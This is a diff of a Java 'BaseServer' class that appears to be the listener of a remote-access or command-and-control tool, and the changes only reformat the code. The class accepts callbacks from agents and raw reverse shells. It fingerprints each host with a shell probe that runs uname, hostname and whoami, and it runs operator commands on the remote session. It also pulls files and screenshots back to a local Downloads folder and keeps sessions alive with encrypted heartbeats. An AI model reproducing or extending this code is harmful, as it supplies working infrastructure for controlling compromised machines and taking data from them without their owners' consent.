@@ -8,7 +8,6 @@ import com.raven.core.output.Logger;
 import com.raven.core.session.Session;
 import com.raven.core.session.SessionManager;
 import com.raven.utils.ServerConfig;
-
 import java.io.*;
 import java.net.Socket;
 import java.nio.file.*;
@@ -33,7 +32,6 @@ public abstract class BaseServer {
     protected final SessionManager Sessions;
     protected final EventManager Events;
     protected volatile boolean Running;
-
     protected final ConcurrentHashMap<Integer, SymmetricCrypto> SessionCryptos = new ConcurrentHashMap<>();
     protected final ConcurrentHashMap<Integer, Object> CommandLocks = new ConcurrentHashMap<>();
     protected final ConcurrentHashMap<Integer, Object> SocketLocks = new ConcurrentHashMap<>();
@@ -92,16 +90,14 @@ public abstract class BaseServer {
         try {
             while (Read < PeekWindow && System.currentTimeMillis() < Dead) {
                 int B = PbIn.read();
-                if (B == -1)
-                    break;
+                if (B == -1) break;
                 Peek[Read++] = (byte) B;
             }
         } catch (java.net.SocketTimeoutException Ignored) {
         } finally {
             Sock.setSoTimeout(0);
         }
-        if (Read == 0)
-            return new DetectionResult(ConnectionType.RAW, PbIn, new byte[0]);
+        if (Read == 0) return new DetectionResult(ConnectionType.RAW, PbIn, new byte[0]);
         PbIn.unread(Peek, 0, Read);
         byte[] P = Arrays.copyOf(Peek, Read);
         String Str;
@@ -111,75 +107,52 @@ public abstract class BaseServer {
             Str = "";
         }
         ConnectionType Type;
-        if (Str.startsWith("{"))
-            Type = ConnectionType.RAVEN;
-        else if (Str.startsWith("GET ") || Str.startsWith("POST ") || Str.startsWith("PUT ") || Str.startsWith("HEAD "))
-            Type = ConnectionType.HTTP;
-        else
-            Type = ConnectionType.RAW;
-        Logger.Verbose(
-                "Detect [" +
-                        Sock.getRemoteSocketAddress() +
-                        "] → " +
-                        Type +
-                        " peek=" +
-                        Str.substring(0, Math.min(Str.length(), 12)));
+        if (Str.startsWith("{")) Type = ConnectionType.RAVEN;
+        else if (Str.startsWith("GET ") || Str.startsWith("POST ") || Str.startsWith("PUT ") || Str.startsWith("HEAD ")) Type = ConnectionType.HTTP;
+        else Type = ConnectionType.RAW;
+        Logger.Verbose("Detect [" + Sock.getRemoteSocketAddress() + "] → " + Type + " peek=" + Str.substring(0, Math.min(Str.length(), 12)));
         return new DetectionResult(Type, PbIn, P);
     }
 
-    protected Map<String, Object> RavenHandshake(
-            InputStream In,
-            OutputStream Out,
-            int TimeoutMs,
-            SymmetricCrypto Crypto) throws Exception {
+    protected Map<String, Object> RavenHandshake(InputStream In, OutputStream Out, int TimeoutMs, SymmetricCrypto Crypto) throws Exception {
         ByteArrayOutputStream Buf = new ByteArrayOutputStream();
         long Dead = System.currentTimeMillis() + TimeoutMs;
         int Depth = 0;
-        boolean InStr = false, Esc = false, Started = false;
+        boolean InStr = false,
+            Esc = false,
+            Started = false;
 
         while (System.currentTimeMillis() < Dead) {
             if (In.available() > 0) {
                 int B = In.read();
-                if (B == -1)
-                    break;
+                if (B == -1) break;
                 Buf.write(B);
                 char Ch = (char) B;
-                if (Esc)
-                    Esc = false;
-                else if (Ch == '\\' && InStr)
-                    Esc = true;
-                else if (Ch == '"')
-                    InStr = !InStr;
+                if (Esc) Esc = false;
+                else if (Ch == '\\' && InStr) Esc = true;
+                else if (Ch == '"') InStr = !InStr;
                 else if (!InStr) {
                     if (Ch == '{') {
                         Depth++;
                         Started = true;
-                    } else if (Ch == '}')
-                        Depth--;
+                    } else if (Ch == '}') Depth--;
                 }
-                if (Started && Depth == 0)
-                    break;
+                if (Started && Depth == 0) break;
             } else {
                 Thread.sleep(30);
             }
         }
 
         String Json = Buf.toString("UTF-8").trim();
-        if (!Json.startsWith("{"))
-            throw new IOException(
-                    "Expected JSON sysinfo, got: " + (Json.length() > 64 ? Json.substring(0, 64) + "…" : Json));
+        if (!Json.startsWith("{")) throw new IOException("Expected JSON sysinfo, got: " + (Json.length() > 64 ? Json.substring(0, 64) + "…" : Json));
 
         @SuppressWarnings("unchecked")
         Map<String, Object> Info = Gson.fromJson(Json, Map.class);
-        for (String F : new String[] { "os", "hostname", "user" })
-            if (!Info.containsKey(F) || Info.get(F) == null)
-                throw new IOException("Agent JSON missing required field: " + F);
+        for (String F : new String[] { "os", "hostname", "user" }) if (!Info.containsKey(F) || Info.get(F) == null) throw new IOException("Agent JSON missing required field: " + F);
 
         Out.write((Crypto.GetKeyAsBase64Url() + "\n").getBytes("UTF-8"));
         Out.flush();
-        Logger.Verbose(
-                "RAVEN handshake OK — " + Info.get("hostname") + " key=" + Crypto.GetKeyAsBase64Url().substring(0, 8)
-                        + "…");
+        Logger.Verbose("RAVEN handshake OK — " + Info.get("hostname") + " key=" + Crypto.GetKeyAsBase64Url().substring(0, 8) + "…");
         return Info;
     }
 
@@ -192,8 +165,7 @@ public abstract class BaseServer {
         Info.put("agentip", RemoteAddr.replaceAll("/|:.*", ""));
         Info.put("shellmode", "Raw");
 
-        String Probe = "echo TCID:$(uname -s 2>/dev/null || echo WIN):" +
-                "$(hostname 2>/dev/null):$(whoami 2>/dev/null):$(uname -m 2>/dev/null)\n";
+        String Probe = "echo TCID:$(uname -s 2>/dev/null || echo WIN):" + "$(hostname 2>/dev/null):$(whoami 2>/dev/null):$(uname -m 2>/dev/null)\n";
         try {
             Out.write(Probe.getBytes("UTF-8"));
             Out.flush();
@@ -209,14 +181,10 @@ public abstract class BaseServer {
                             String Line = StripAnsi(Resp.substring(Idx + 5, End).trim());
                             String[] Parts = Line.split(":", -1);
                             if (Parts.length >= 4) {
-                                if (!Parts[0].isEmpty())
-                                    Info.put("os", Parts[0]);
-                                if (!Parts[1].isEmpty())
-                                    Info.put("hostname", Parts[1]);
-                                if (!Parts[2].isEmpty())
-                                    Info.put("user", Parts[2]);
-                                if (!Parts[3].isEmpty())
-                                    Info.put("architecture", Parts[3]);
+                                if (!Parts[0].isEmpty()) Info.put("os", Parts[0]);
+                                if (!Parts[1].isEmpty()) Info.put("hostname", Parts[1]);
+                                if (!Parts[2].isEmpty()) Info.put("user", Parts[2]);
+                                if (!Parts[3].isEmpty()) Info.put("architecture", Parts[3]);
                             }
                             break;
                         }
@@ -235,96 +203,79 @@ public abstract class BaseServer {
     protected void MonitorSession(int SessionId, Socket Sock, boolean IsRaw) {
         try {
             Sock.setKeepAlive(true);
-        } catch (Exception Ignored) {
-        }
-        Thread T = new Thread(
-                () -> {
-                    while (Running && Sessions.Exists(SessionId)) {
-                        try {
-                            Thread.sleep(15_000);
-                            if (!Running || !Sessions.Exists(SessionId))
-                                break;
-                            if (Sock.isClosed() || !Sock.isConnected() || Sock.isOutputShutdown())
-                                throw new IOException(
-                                        "Socket closed");
-                            if (!IsRaw) {
-                                Object SockLock = SocketLocks.get(SessionId);
-                                if (SockLock == null)
-                                    break;
-                                SymmetricCrypto Crypto = SessionCryptos.get(SessionId);
-                                if (Crypto == null)
-                                    break;
-                                synchronized (SockLock) {
-                                    try {
-                                        byte[] Frame = Crypto.Encrypt("__PING__".getBytes("UTF-8"));
-                                        byte[] Msg = new byte[Frame.length + EndMarker.length];
-                                        System.arraycopy(Frame, 0, Msg, 0, Frame.length);
-                                        System.arraycopy(EndMarker, 0, Msg, Frame.length, EndMarker.length);
-                                        Sock.getOutputStream().write(Msg);
-                                        Sock.getOutputStream().flush();
-                                    } catch (Exception E) {
-                                        throw new IOException("Heartbeat failed: " + E.getMessage());
-                                    }
-                                }
+        } catch (Exception Ignored) {}
+        Thread T = new Thread(() -> {
+            while (Running && Sessions.Exists(SessionId)) {
+                try {
+                    Thread.sleep(15_000);
+                    if (!Running || !Sessions.Exists(SessionId)) break;
+                    if (Sock.isClosed() || !Sock.isConnected() || Sock.isOutputShutdown()) throw new IOException("Socket closed");
+                    if (!IsRaw) {
+                        Object SockLock = SocketLocks.get(SessionId);
+                        if (SockLock == null) break;
+                        SymmetricCrypto Crypto = SessionCryptos.get(SessionId);
+                        if (Crypto == null) break;
+                        synchronized (SockLock) {
+                            try {
+                                byte[] Frame = Crypto.Encrypt("__PING__".getBytes("UTF-8"));
+                                byte[] Msg = new byte[Frame.length + EndMarker.length];
+                                System.arraycopy(Frame, 0, Msg, 0, Frame.length);
+                                System.arraycopy(EndMarker, 0, Msg, Frame.length, EndMarker.length);
+                                Sock.getOutputStream().write(Msg);
+                                Sock.getOutputStream().flush();
+                            } catch (Exception E) {
+                                throw new IOException("Heartbeat failed: " + E.getMessage());
                             }
-                        } catch (InterruptedException E) {
-                            Thread.currentThread().interrupt();
-                            break;
-                        } catch (Exception E) {
-                            Logger.Verbose("Session-" + SessionId + " disconnected: " + E.getMessage());
-                            Events.Trigger(
-                                    EventType.AgentDisconnected,
-                                    EventManager.BuildData("ID", SessionId, "Reason", E.getMessage()));
-                            RemoveSession(SessionId);
-                            break;
                         }
                     }
-                },
-                "Monitor-" + SessionId);
+                } catch (InterruptedException E) {
+                    Thread.currentThread().interrupt();
+                    break;
+                } catch (Exception E) {
+                    Logger.Verbose("Session-" + SessionId + " disconnected: " + E.getMessage());
+                    Events.Trigger(EventType.AgentDisconnected, EventManager.BuildData("ID", SessionId, "Reason", E.getMessage()));
+                    RemoveSession(SessionId);
+                    break;
+                }
+            }
+        }, "Monitor-" + SessionId);
         T.setDaemon(true);
         T.start();
     }
 
     public String[] ExecuteCommand(int SessionId, String Command) {
         Optional<Session> Opt = Sessions.Get(SessionId);
-        if (Opt.isEmpty())
-            return Fail("Session not found");
+        if (Opt.isEmpty()) return Fail("Session not found");
         Session S = Opt.get();
         Object Lck = CommandLocks.get(SessionId);
-        if (Lck == null)
-            return Fail("Session lock missing");
+        if (Lck == null) return Fail("Session lock missing");
 
         synchronized (Lck) {
             try {
                 String Cmd = Command.trim();
-                if (Cmd.isEmpty())
-                    return Fail("Empty command");
+                if (Cmd.isEmpty()) return Fail("Empty command");
                 String CmdLow = Cmd.toLowerCase();
 
-                if (CmdLow.startsWith("upload"))
-                    return HandleUpload(S, Cmd);
-                if (CmdLow.startsWith("download") || CmdLow.startsWith("dl ") || CmdLow.startsWith("screenshot"))
-                    return S.IsRawMode() ? Fail("Not supported in raw mode") : SendThenDownload(S, Cmd);
+                if (CmdLow.startsWith("upload")) return HandleUpload(S, Cmd);
+                if (CmdLow.startsWith("download") || CmdLow.startsWith("dl ") || CmdLow.startsWith("screenshot")) return S.IsRawMode() ? Fail("Not supported in raw mode") : SendThenDownload(S, Cmd);
 
                 if (S.IsRawMode()) {
                     Object SLck = SocketLocks.get(SessionId);
-                    if (SLck == null)
-                        return Fail("Socket lock missing");
+                    if (SLck == null) return Fail("Socket lock missing");
                     synchronized (SLck) {
-                        S.GetSocket().getOutputStream().write((Cmd + "\n").getBytes("UTF-8"));
+                        S.GetSocket()
+                            .getOutputStream()
+                            .write((Cmd + "\n").getBytes("UTF-8"));
                         S.GetSocket().getOutputStream().flush();
                     }
                     byte[] Resp = ReadRawResponse(S.GetSocket());
-                    if (Resp == null || Resp.length == 0)
-                        return Fail("  No response");
+                    if (Resp == null || Resp.length == 0) return Fail("  No response");
                     return new String[] { "true", StripAnsi(new String(Resp, "UTF-8")) };
                 } else {
                     SymmetricCrypto Crypto = SessionCryptos.get(SessionId);
-                    if (Crypto == null)
-                        return Fail("Session crypto missing");
+                    if (Crypto == null) return Fail("Session crypto missing");
                     Object SLck = SocketLocks.get(SessionId);
-                    if (SLck == null)
-                        return Fail("Socket lock missing");
+                    if (SLck == null) return Fail("Socket lock missing");
                     byte[] Frame;
                     synchronized (SLck) {
                         Frame = BuildFrame(Crypto, Cmd.getBytes("UTF-8"));
@@ -332,8 +283,7 @@ public abstract class BaseServer {
                         S.GetSocket().getOutputStream().flush();
                     }
                     byte[] Resp = ReadFramedResponse(S.GetSocket(), Config.GetCommandTimeout(), Crypto);
-                    if (Resp == null || Resp.length == 0)
-                        return Fail("  No response from agent");
+                    if (Resp == null || Resp.length == 0) return Fail("  No response from agent");
                     return new String[] { "true", new String(Resp, "UTF-8") };
                 }
             } catch (Exception E) {
@@ -366,8 +316,7 @@ public abstract class BaseServer {
             } catch (java.net.SocketTimeoutException E) {
                 break;
             }
-            if (N == -1)
-                break;
+            if (N == -1) break;
             Buf.write(Tmp, 0, N);
             byte[] Cur = Buf.toByteArray();
             if (Cur.length >= MinFrameBytes && EndsWith(Cur, EndMarker)) {
@@ -394,8 +343,7 @@ public abstract class BaseServer {
             try {
                 byte[] Decrypted = Crypto.Decrypt(Payload);
                 String Text = new String(Decrypted, "UTF-8");
-                if (Text.equals("__PONG__"))
-                    return null;
+                if (Text.equals("__PONG__")) return null;
                 return Decrypted;
             } catch (Exception E) {
                 throw new IOException("Decrypt failed: " + E.getMessage());
@@ -412,9 +360,7 @@ public abstract class BaseServer {
             Futures.add(F);
         }
         try {
-            CompletableFuture.allOf(Futures.toArray(new CompletableFuture[0])).get(
-                    Config.GetCommandTimeout() + 5000,
-                    TimeUnit.MILLISECONDS);
+            CompletableFuture.allOf(Futures.toArray(new CompletableFuture[0])).get(Config.GetCommandTimeout() + 5000, TimeUnit.MILLISECONDS);
         } catch (Exception E) {
             Logger.Warn("Broadcast partial timeout: " + E.getMessage());
         }
@@ -437,12 +383,10 @@ public abstract class BaseServer {
             try {
                 N = Sock.getInputStream().read(Tmp);
             } catch (java.net.SocketTimeoutException E) {
-                if (Buf.size() > 0)
-                    break;
+                if (Buf.size() > 0) break;
                 continue;
             }
-            if (N == -1)
-                break;
+            if (N == -1) break;
             Buf.write(Tmp, 0, N);
         }
         Sock.setSoTimeout(0);
@@ -461,45 +405,31 @@ public abstract class BaseServer {
             } catch (java.net.SocketTimeoutException E) {
                 break;
             }
-            if (N == -1)
-                break;
+            if (N == -1) break;
             Buf.write(Tmp, 0, N);
             byte[] Cur = Buf.toByteArray();
-            if (Cur.length >= MinFrameBytes && EndsWith(Cur, EndMarker))
-                return Arrays.copyOf(
-                        Cur,
-                        Cur.length - EndMarker.length);
+            if (Cur.length >= MinFrameBytes && EndsWith(Cur, EndMarker)) return Arrays.copyOf(Cur, Cur.length - EndMarker.length);
         }
         Sock.setSoTimeout(0);
         byte[] Final = Buf.toByteArray();
-        if (Final.length >= MinFrameBytes && EndsWith(Final, EndMarker))
-            return Arrays.copyOf(
-                    Final,
-                    Final.length - EndMarker.length);
+        if (Final.length >= MinFrameBytes && EndsWith(Final, EndMarker)) return Arrays.copyOf(Final, Final.length - EndMarker.length);
         return Final.length > 0 ? Final : null;
     }
 
     private String[] HandleUpload(Session S, String Command) {
-        if (S.IsRawMode())
-            return Fail("Upload unsupported in raw mode");
+        if (S.IsRawMode()) return Fail("Upload unsupported in raw mode");
         SymmetricCrypto Crypto = SessionCryptos.get(S.GetId());
-        if (Crypto == null)
-            return Fail("Session crypto missing");
+        if (Crypto == null) return Fail("Session crypto missing");
         String[] Parts = Command.split("\\s+", 3);
-        if (Parts.length < 2)
-            return Fail("Usage: upload <local> [remote]");
+        if (Parts.length < 2) return Fail("Usage: upload <local> [remote]");
         String Local = Parts[1];
         String Remote = Parts.length > 2 ? Parts[2] : "";
-        if (!Files.exists(Paths.get(Local)))
-            return Fail("File not found: " + Local);
+        if (!Files.exists(Paths.get(Local))) return Fail("File not found: " + Local);
         try {
             String Name = Paths.get(Local).getFileName().toString();
             Object SLck = SocketLocks.get(S.GetId());
-            if (SLck == null)
-                return Fail("Socket lock missing");
-            byte[] CmdFrame = BuildFrame(
-                    Crypto,
-                    (Remote.isEmpty() ? "upload " + Name : "upload " + Remote).getBytes("UTF-8"));
+            if (SLck == null) return Fail("Socket lock missing");
+            byte[] CmdFrame = BuildFrame(Crypto, (Remote.isEmpty() ? "upload " + Name : "upload " + Remote).getBytes("UTF-8"));
             OutputStream Out = S.GetSocket().getOutputStream();
             synchronized (SLck) {
                 Out.write(CmdFrame);
@@ -527,11 +457,9 @@ public abstract class BaseServer {
 
     private String[] SendThenDownload(Session S, String Command) {
         SymmetricCrypto Crypto = SessionCryptos.get(S.GetId());
-        if (Crypto == null)
-            return Fail("Session crypto missing");
+        if (Crypto == null) return Fail("Session crypto missing");
         Object SLck = SocketLocks.get(S.GetId());
-        if (SLck == null)
-            return Fail("Socket lock missing");
+        if (SLck == null) return Fail("Socket lock missing");
         try {
             byte[] Frame = BuildFrame(Crypto, Command.getBytes("UTF-8"));
             synchronized (SLck) {
@@ -556,12 +484,10 @@ public abstract class BaseServer {
                 } catch (java.net.SocketTimeoutException E) {
                     break;
                 }
-                if (N == -1)
-                    break;
+                if (N == -1) break;
                 Buf.write(Tmp, 0, N);
                 byte[] Cur = Buf.toByteArray();
-                if (ContainsMarker(Cur, MetaMarker) || EndsWith(Cur, EndMarker))
-                    break;
+                if (ContainsMarker(Cur, MetaMarker) || EndsWith(Cur, EndMarker)) break;
             }
             S.GetSocket().setSoTimeout(0);
             byte[] Data = Buf.toByteArray();
@@ -582,21 +508,16 @@ public abstract class BaseServer {
                     } catch (java.net.SocketTimeoutException E) {
                         break;
                     }
-                    if (N == -1)
-                        break;
+                    if (N == -1) break;
                     FileBuf.write(Tmp, 0, N);
                 }
                 S.GetSocket().setSoTimeout(0);
                 byte[] FileData = FileBuf.toByteArray();
-                if (EndsWith(FileData, EndMarker))
-                    FileData = Arrays.copyOf(
-                            FileData,
-                            FileData.length - EndMarker.length);
+                if (EndsWith(FileData, EndMarker)) FileData = Arrays.copyOf(FileData, FileData.length - EndMarker.length);
                 String Saved = SaveFile(Filename, FileData, S.GetId());
                 return Saved != null ? new String[] { "true", "Saved: " + Saved } : Fail("Failed to save file");
             }
-            if (EndsWith(Data, EndMarker))
-                Data = Arrays.copyOf(Data, Data.length - EndMarker.length);
+            if (EndsWith(Data, EndMarker)) Data = Arrays.copyOf(Data, Data.length - EndMarker.length);
             return new String[] { "true", Crypto.DecryptString(Data) };
         } catch (Exception E) {
             return Fail("Download error: " + E.getMessage());
@@ -607,15 +528,15 @@ public abstract class BaseServer {
         try {
             Path Dir = Paths.get("Downloads/Session_" + SessionId);
             Files.createDirectories(Dir);
-            String Base = Filename, Ext = "";
+            String Base = Filename,
+                Ext = "";
             int Dot = Filename.lastIndexOf('.');
             if (Dot > 0) {
                 Base = Filename.substring(0, Dot);
                 Ext = Filename.substring(Dot);
             }
             Path Target = Dir.resolve(Filename);
-            for (int I = 1; Files.exists(Target); I++)
-                Target = Dir.resolve(Base + "_" + I + Ext);
+            for (int I = 1; Files.exists(Target); I++) Target = Dir.resolve(Base + "_" + I + Ext);
             Files.write(Target, Data);
             return Target.toString();
         } catch (IOException E) {
@@ -637,8 +558,7 @@ public abstract class BaseServer {
     }
 
     public String GetKeyBase64() {
-        if (SessionCryptos.isEmpty())
-            return "(no active sessions)";
+        if (SessionCryptos.isEmpty()) return "(no active sessions)";
         return SessionCryptos.values().iterator().next().GetKeyAsBase64Url();
     }
 
@@ -675,11 +595,8 @@ public abstract class BaseServer {
     }
 
     protected boolean EndsWith(byte[] Data, byte[] Suffix) {
-        if (Data.length < Suffix.length)
-            return false;
-        for (int I = 0; I < Suffix.length; I++)
-            if (Data[Data.length - Suffix.length + I] != Suffix[I])
-                return false;
+        if (Data.length < Suffix.length) return false;
+        for (int I = 0; I < Suffix.length; I++) if (Data[Data.length - Suffix.length + I] != Suffix[I]) return false;
         return true;
     }
 
@@ -689,9 +606,7 @@ public abstract class BaseServer {
 
     protected int IndexOf(byte[] Data, byte[] Pat) {
         outer: for (int I = 0; I <= Data.length - Pat.length; I++) {
-            for (int J = 0; J < Pat.length; J++)
-                if (Data[I + J] != Pat[J])
-                    continue outer;
+            for (int J = 0; J < Pat.length; J++) if (Data[I + J] != Pat[J]) continue outer;
             return I;
         }
         return -1;
